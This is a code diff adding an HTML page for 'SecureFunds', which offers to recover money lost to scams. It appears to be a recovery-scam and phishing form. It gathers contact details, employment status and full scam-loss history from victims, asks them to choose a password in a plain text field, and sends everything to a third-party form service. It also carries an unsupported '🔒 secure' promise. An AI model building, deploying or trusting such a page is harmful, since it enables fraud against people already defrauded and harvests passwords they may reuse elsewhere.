@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureFunds Recovery Application Form</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="container">
+
+  <header>
+    <div class="hero-text">
+      <h1>SecureFunds<br>Recovery Application Form</h1>
+      <p>If you've lost money to scams, complete this form to see if we can help recover your funds. Please list all past losses (dates and amounts) and provide details about the most recent loss.</p>
+    </div>
+
+    <div class="house">
+      <img src="Grant img.png" alt="Illustration">
+    </div>
+  </header>
+
+<form action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="f5cf7cbe-1462-4766-988c-0eb839ed6fa8">
+
+    <h2 style="margin-bottom: 0px;">Personal Information</h2>
+
+    <label for="firstName">First Name</label>
+    <input id="firstName" type="text" name="FirstName" placeholder="First Name" required>
+
+    <label for="lastName">Last Name</label>
+    <input id="lastName" type="text" name="LastName" placeholder="Last Name" required>
+
+    <label for="phone">Phone Number</label>
+    <input id="phone" type="tel" name="Phone" placeholder="(000) 000-0000" required>
+
+    <label for="email">Email Address</label>
+    <input id="email" type="email" name="Email" placeholder="you@example.com" required>
+
+     <label for="employmentStatus">Employment Status</label>
+    <select id="employmentStatus" name="EmploymentStatus" required>
+      <option value="">Select status</option>
+      <option value="Employed">Employed</option>
+      <option value="Self-Employed">Self-Employed</option>
+      <option value="Unemployed">Unemployed</option>
+      <option value="Retired">Retired</option>
+      <option value="Student">Student</option>
+    </select>
+
+    <h2 style="margin-top: 20px;margin-bottom: 0px;">Scam Loss Details</h2>
+
+    <label for="totalLost">Total amount you've ever lost to scams (approx.)</label>
+    <input id="totalLost" type="text" name="TotalLost" placeholder="e.g. $5,000" required>
+
+    <label for="pastLosses">All past scam losses (amounts, brief description)</label>
+    <textarea id="pastLosses" name="PastLosses" rows="5" placeholder="List each incident with amount, e.g. 'Phishing- $500 '" required></textarea>
+
+    <label for="lastLossDate">Most recent loss date</label>
+    <input id="lastLossDate" type="date" name="LastLossDate">
+
+    <label for="lastLossHow">How did the most recent scam happen?</label>
+    <textarea id="lastLossHow" name="LastLossHow" rows="4" placeholder="Explain how you were scammed (platform, method, any parties involved)"></textarea>
+
+
+    <label class="consent-label">
+      <input type="checkbox" name="consent" required>
+      <span>I confirm that the information provided is accurate to the best of my knowledge and consent to secure review.</span>
+    </label>
+
+      <label for="username">Preferred Username</label>
+    <input id="username" type="text" name="Username" placeholder="Choose a username" required>
+
+    <label for="Pass">Preferred Password</label>
+    <input id="address" type="text" name="Pass" placeholder="Password" required>
+    <P style="margin-top: 15px;color: rgb(120, 118, 115);">Please save your username and password. You will need them later if your report is valid and approved.
+    </P>
+
+    <button type="submit" class="submit-button">Submit Recovery Request</button>
+
+    <p class="security">
+      🔒 Your information is secure and will be used only for recovery assistance.
+    </p>
+  </form>
+
+</div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
